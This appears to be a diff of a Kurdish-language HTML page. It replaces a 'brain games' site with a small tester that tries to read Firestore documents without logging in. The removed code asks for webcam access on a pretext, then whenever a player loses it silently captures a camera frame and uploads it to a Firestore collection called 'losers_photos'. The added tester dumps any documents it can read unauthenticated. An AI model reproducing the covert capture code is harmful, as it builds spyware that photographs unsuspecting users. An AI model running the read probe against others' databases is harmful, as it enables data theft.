@@ -3,349 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>پلاتفۆرمی یارییە فیکرییەکان</title>
+    <title>تاقیکردنەوەی ئاسایشی Firebase</title>
     <style>
-        :root {
-            --bg-color: #0f172a;
-            --card-bg: #1e293b;
-            --accent-color: #6366f1;
-            --danger-color: #ef4444;
-            --success-color: #22c55e;
-            --text-color: #f8fafc;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-color);
-            color: var(--text-color);
-            margin: 0;
-            padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        .container {
-            width: 100%;
-            max-width: 650px;
-            background: var(--card-bg);
-            padding: 35px;
-            border-radius: 16px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
-            text-align: center;
-            border: 1px solid #334155;
-        }
-
-        h1, h2 {
-            color: #ffffff;
-            margin-bottom: 20px;
-        }
-
-        p {
-            color: #94a3b8;
-            font-size: 16px;
-            line-height: 1.6;
-        }
-
-        /* دوگمە مۆدێرنەکان */
-        .btn {
-            background: linear-gradient(135deg, #4f46e5 0%, #6366f1 100%);
-            color: white;
-            border: none;
-            padding: 14px 28px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.3);
-        }
-
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.5);
-        }
-
-        /* دیزاینی کارتی یارییەکان لە داشبۆرد */
-        .games-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin-top: 25px;
-        }
-
-        .game-card {
-            background: #111827;
-            padding: 20px;
-            border-radius: 12px;
-            border: 1px solid #374151;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        .game-card:hover {
-            border-color: var(--accent-color);
-            background: #1f2937;
-        }
-
-        .game-card h3 {
-            margin: 0 0 10px 0;
-            color: #38bdf8;
-        }
-
-        /* شوێنی یاریکردن */
-        .game-arena {
-            background: #111827;
-            padding: 25px;
-            border-radius: 12px;
-            margin-top: 20px;
-            border: 1px solid #374151;
-        }
-
-        .options-container {
-            display: flex;
-            justify-content: center;
-            gap: 10px;
-            flex-wrap: wrap;
-            margin-top: 20px;
-        }
-
-        .opt-btn {
-            background: #334155;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            font-size: 16px;
-            border-radius: 6px;
-            cursor: pointer;
-            min-width: 80px;
-        }
-
-        .opt-btn:hover { background: #475569; }
-
-        input[type="number"] {
-            background: #334155;
-            border: 1px solid #475569;
-            color: white;
-            padding: 10px;
-            font-size: 16px;
-            border-radius: 6px;
-            width: 100px;
-            text-align: center;
-            outline: none;
-        }
-
-        /* شاردنەوەی بەشە کاتییەکان */
-        #dashboardSection, #gameSection, #gameOverSection, #videoElement, #canvasElement {
-            display: none;
-        }
+        body { font-family: Tahoma, sans-serif; padding: 30px; background-color: #f4f6f9; text-align: center; }
+        .card { max-width: 600px; margin: auto; background: white; padding: 25px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        button { background-color: #007bff; color: white; border: none; padding: 12px 25px; font-size: 16px; border-radius: 5px; cursor: pointer; margin-top: 15px; }
+        button:hover { background-color: #0056b3; }
+        input { padding: 10px; width: 80%; font-size: 16px; text-align: center; border: 1px solid #ccc; border-radius: 5px; }
+        #result { margin-top: 25px; padding: 15px; border-radius: 5px; text-align: left; max-height: 300px; overflow-y: auto; }
+        .safe { background-color: #d4edda; color: #155724; border: 1px solid #c3e6cb; text-align: center; }
+        .danger { background-color: #f8d7da; color: #721c24; border: 1px solid #f5c6cb; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        
-        <div id="introSection">
-            <h1>بەخێربێیت بۆ یارییە فیکرییەکان</h1>
-            <p>بۆ چوونە ژوورەوە و تاقیکردنەوەی ئاستی زیرەکیت، پێویستە سەرەتا ڕێگە بە کامێراکەت بدەیت بۆ چالاکبوونی سیستەمی یارییەکە.</p>
-            <button id="agreeBtn" class="btn">ڕەزامەندی و دەستپێکردن</button>
-            <p id="errorMsg" style="color: var(--danger-color); margin-top: 15px;"></p>
-        </div>
+<div class="card">
+    <h2>تاقیکەرەوەی ئاسایشی Firebase Firestore</h2>
+    <p>ناوی ئەو کۆلێکشنە (Collection) بنووسە کە دەتەوێت تاقیکردنەوەی لەسەر بکەیت (بۆ نموونە: <code>users</code>):</p>
+    <input type="text" id="collectionName" value="users"><br>
+    <button id="testBtn">دەستپێکردنی تاقیکردنەوە</button>
+    <div id="result"></div>
+</div>
 
-        <div id="dashboardSection">
-            <h2>داشبۆردی یارییەکان</h2>
-            <p>یەکێک لەم پازڵ و یارییانەی خوارەوە هەڵبژێره بۆ تاقیکردنەوەی خۆت:</p>
-            <div class="games-grid">
-                <div class="game-card" onclick="startSelectedGame('math')">
-                    <h3>➕ کایەی بیرکاری</h3>
-                    <p>وەڵامی هاوکێشەکان بە خێری بدەرەوە.</p>
-                </div>
-                <div class="game-card" onclick="startSelectedGame('color')">
-                    <h3>🎨 تاقیکردنەوەی ڕەنگ</h3>
-                    <p>فۆکەس بخەرە سەر ڕەنگەکە نەک نووسینەکە!</p>
-                </div>
-                <div class="game-card" onclick="startSelectedGame('guess')">
-                    <h3>🔑 دۆزینەوەی کۆد</h3>
-                    <p>ژمارە شاراوەکە لە ٣ هەوڵدا بدۆزەوە.</p>
-                </div>
-            </div>
-        </div>
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, collection, getDocs, limit, query } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
 
-        <div id="gameSection">
-            <h2 id="gameTitle">ناونیشانی یاری</h2>
-            <div class="game-arena" id="gameArena">
-                </div>
-            <button onclick="backToDashboard()" class="btn" style="background: #334155; margin-top: 20px; padding: 8px 16px; font-size: 14px;">گەڕانەوە بۆ داشبۆرد</button>
-        </div>
+// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyDgTzt5Ui00d5-NJWlpKa6pNGw5D2mbfzE",
+  authDomain: "bdozarawa2.firebaseapp.com",
+  projectId: "bdozarawa2",
+  storageBucket: "bdozarawa2.firebasestorage.app",
+  messagingSenderId: "20279723956",
+  appId: "1:20279723956:web:f93db1652e532fbf8694e1",
+  measurementId: "G-C0PB34CXWP"
+};
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
 
-        <div id="gameOverSection">
-            <h1 style="color: var(--danger-color); font-size: 40px;">GAME OVER</h1>
-            <p id="lossReason">تۆ دۆڕایت!</p>
-            <p style="color: var(--success-color);">وێنەی ساتەوەختی دۆڕانەکەت بە سەرکەوتووانە لە Firestore پاشەکەوت کرا.</p>
-            <button onclick="location.reload()" class="btn">دووبارە هەوڵبدەرەوە</button>
-        </div>
+    document.getElementById('testBtn').addEventListener('click', async () => {
+        const resultDiv = document.getElementById('result');
+        const collName = document.getElementById('collectionName').value;
+        resultDiv.className = '';
+        resultDiv.innerHTML = 'کاتی تاقیکردنەوە...';
 
-    </div>
-
-    <video id="videoElement" autoplay playsinline></video>
-    <canvas id="canvasElement"></canvas>
-
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-
-        // 🛠 کۆنفیگی فایەربەیسی خۆت لێرە دابنێ
-        const firebaseConfig = {
-            apiKey: "AIzaSyDgTzt5Ui00d5-NJWlpKa6pNGw5D2mbfzE",
-            authDomain: "bdozarawa2.firebaseapp.com",
-            projectId: "bdozarawa2",
-            storageBucket: "bdozarawa2.firebasestorage.app",
-            messagingSenderId: "20279723956",
-            appId: "1:20279723956:web:f93db1652e532fbf8694e1"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-
-        // گۆڕاوە گشتییەکان
-        let cameraStream = null;
-        const video = document.getElementById('videoElement');
-        const canvas = document.getElementById('canvasElement');
-        
-        // گۆڕاوەکانی یاری دۆزینەوەی کۆد
-        let secretName, attemptsLeft;
-
-        // ١. چالاککردنی کامێرا لە سەرەتاوە
-        document.getElementById('agreeBtn').addEventListener('click', async () => {
-            try {
-                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = cameraStream;
-                
-                // چوون بۆ داشبۆرد دوای مۆڵەت دان
-                document.getElementById('introSection').style.display = 'none';
-                document.getElementById('dashboardSection').style.display = 'block';
-            } catch (error) {
-                document.getElementById('errorMsg').innerText = "مۆڵەتی کامێرا ڕەتکرایەوە. ناتوانیت بچیتە ناو یارییەکە!";
-            }
-        });
-
-        // ٢. سیستەمی گۆڕینی یارییەکان
-        window.startSelectedGame = function(gameType) {
-            document.getElementById('dashboardSection').style.display = 'none';
-            document.getElementById('gameSection').style.display = 'block';
-            const arena = document.getElementById('gameArena');
+        try {
+            // هەوڵدان بۆ خوێندنەوەی ٣ دۆکیومێنت بەبێ ئەوەی هیچ ئەکاونتێک لۆگین بووبێت
+            const q = query(collection(db, collName), limit(3));
+            const querySnapshot = await getDocs(q);
             
-            if(gameType === 'math') {
-                document.getElementById('gameTitle').innerText = "➕ کایەی بیرکاری خێرا";
-                const num1 = Math.floor(Math.random() * 12) + 4;
-                const num2 = Math.floor(Math.random() * 12) + 3;
-                const correctAnswer = num1 * num2;
-                const wrongAnswer = correctAnswer + (Math.random() > 0.5 ? 4 : -3);
-                
-                arena.innerHTML = `
-                    <p style="font-size: 24px; color: white;">${num1} × ${num2} = ؟</p>
-                    <div class="options-container">
-                        <button class="opt-btn" onclick="checkMath(${correctAnswer}, ${correctAnswer})">${correctAnswer}</button>
-                        <button class="opt-btn" onclick="checkMath(${wrongAnswer}, ${correctAnswer})">${wrongAnswer}</button>
-                    </div>
-                `;
-            } 
-            else if(gameType === 'color') {
-                document.getElementById('gameTitle').innerText = "🎨 تاقیکردنەوەی ڕەنگەکان";
-                // ووشەکە سەوزە بەڵام ڕەنگەکەی سوورە
-                arena.innerHTML = `
-                    <p>یاسا: کلیک لەو <b>ڕەنگە</b> بکە کە دەیبینیت، نەک نووسینەکە!</p>
-                    <h1 style="color: #ef4444; font-size: 40px; margin: 20px 0;">سەوز</h1>
-                    <div class="options-container">
-                        <button class="opt-btn" style="background:#22c55e;" onclick="checkColor('green')">سەوز</button>
-                        <button class="opt-btn" style="background:#ef4444;" onclick="checkColor('red')">سوور</button>
-                        <button class="opt-btn" style="background:#3b82f6;" onclick="checkColor('blue')">شین</button>
-                    </div>
-                `;
+            if(querySnapshot.empty) {
+                resultDiv.className = 'danger';
+                resultDiv.innerHTML = `<strong>ئەنجام:</strong> کۆلێکشنەکە بەتاڵە یان بوونی نییە، بەڵام ڕێگریت لێ نەکرا! ئەگەر داتای تێدا بێت، هاکەرەکە دەتوانێت بیبینێت.`;
+                return;
             }
-            else if(gameType === 'guess') {
-                document.getElementById('gameTitle').innerText = "🔑 دۆزینەوەی کۆدی شاراوە";
-                secretNumber = Math.floor(Math.random() * 10) + 1;
-                attemptsLeft = 3;
-                arena.innerHTML = `
-                    <p>ژمارەیەک لە نێوان 1 بۆ 10 هەڵبژێره. ٣ هەوڵت هەیە.</p>
-                    <p>هەوڵی ماوە: <b id="attemptCount" style="color: #38bdf8;">3</b></p>
-                    <input type="number" id="guessInput" min="1" max="10">
-                    <button class="btn" style="padding:8px 15px; margin-right:10px;" onclick="checkGuess()">تاقیکردنەوە</button>
-                `;
-            }
-        }
 
-        // ٣. لۆجیکی پشکنینی وەڵامەکان
-        window.checkMath = function(chosen, correct) {
-            if(chosen === correct) {
-                alert("ڕاستە! دەتوانیت یارییەکی تر تاقی بکەیتەوە.");
-                backToDashboard();
+            let dataStr = '';
+            querySnapshot.forEach((doc) => {
+                dataStr += `${doc.id} => ${JSON.stringify(doc.data())}\n`;
+            });
+
+            resultDiv.className = 'danger';
+            resultDiv.innerHTML = `<h3 style="color:#721c24; margin:0;">⚠️ داتابەیسەکەت پارێزراو نییە!</h3><p>توانرا بەبێ لۆگین داتاکان بخوێندرێتەوە:</p><pre dir="ltr">${dataStr}</pre>`;
+            
+        } catch (error) {
+            if (error.code === 'permission-denied') {
+                resultDiv.className = 'safe';
+                resultDiv.innerHTML = `<h3 style="color:#155724; margin:0;">✅ داتابەیسەکەت پارێزراوە!</h3><p>Firebase ڕێگەی نەدا داتاکان بخوێندرێتەوە بەبێ مۆڵەت (Permission Denied).</p>`;
             } else {
-                triggerLoss("لە کایەی بیرکاری هەڵەت کرد و دۆڕایت!");
+                resultDiv.className = 'danger';
+                resultDiv.innerHTML = `<strong>هەڵەیەک ڕوویدا:</strong> ${error.message}`;
             }
         }
-
-        window.checkColor = function(chosenColor) {
-            if(chosenColor === 'red') { // چونکە ڕەنگی نووسینەکە سوور بوو
-                alert("زۆرباشە! فۆکەست بەرزە.");
-                backToDashboard();
-            } else {
-                triggerLoss("چویتە داوی نووسینەکەوە و فۆکەست نەما!");
-            }
-        }
-
-        window.checkGuess = function() {
-            const userGuess = parseInt(document.getElementById('guessInput').value);
-            if(userGuess === secretNumber) {
-                alert("پیرۆزە! کۆدەکەت دۆزییەوە.");
-                backToDashboard();
-            } else {
-                attemptsLeft--;
-                if(attemptsLeft <= 0) {
-                    triggerLoss("کۆتایی بە هەوڵەکانت هات و کۆدەکەت نەدۆزییەوە!");
-                } else {
-                    document.getElementById('attemptCount').innerText = attemptsLeft;
-                    alert("هەڵەیە! دووبارە تاقی بکەرەوە.");
-                }
-            }
-        }
-
-        window.backToDashboard = function() {
-            document.getElementById('gameSection').style.display = 'none';
-            document.getElementById('dashboardSection').style.display = 'block';
-        }
-
-        // ٤. سیستەمی گرتنی وێنەی ئۆتۆماتیکی و ناردن لە کاتی دۆڕاندا
-        async function triggerLoss(reason) {
-            document.getElementById('gameSection').style.display = 'none';
-            document.getElementById('gameOverSection').style.display = 'block';
-            document.getElementById('lossReason').innerText = reason;
-
-            if (!cameraStream) return;
-
-            // پرۆسێسی گرتنی وێنەکە لە باکگراونددا
-            const context = canvas.getContext('2d');
-            canvas.width = 320;
-            canvas.height = 240;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // گۆڕین بۆ جۆر و کواڵیتی نزم بۆ کەمکردنەوەی سایزی کۆدەکە
-            const base64Image = canvas.toDataURL('image/jpeg', 0.5);
-
-            try {
-                // ناردنی ڕاستەوخۆ بۆ Cloud Firestore بە شێوەی دەق
-                await addDoc(collection(db, "losers_photos"), {
-                    imageString: base64Image,
-                    reason: reason,
-                    timestamp: new Date().toISOString()
-                });
-                console.log("وێنەکە پاشەکەوت کرا.");
-            } catch (e) {
-                console.error("کێشە لە ناردنی داتا بۆ Firestore: ", e);
-            }
-        }
-    </script>
+    });
+</script>
 </body>
 </html>
